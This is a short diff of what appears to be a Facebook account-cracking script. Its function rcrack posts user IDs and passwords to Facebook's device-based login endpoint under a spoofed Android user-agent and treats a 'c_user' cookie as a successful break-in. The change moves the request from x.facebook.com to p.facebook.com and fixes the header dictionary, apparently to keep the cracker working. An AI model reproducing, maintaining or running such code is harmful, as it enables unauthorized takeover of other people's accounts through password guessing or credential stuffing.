@@ -830,10 +830,10 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',}
     
-			}
-						lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+			
+						lo = session.post('https://p.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			
 			if 'c_user' in log_cookies:
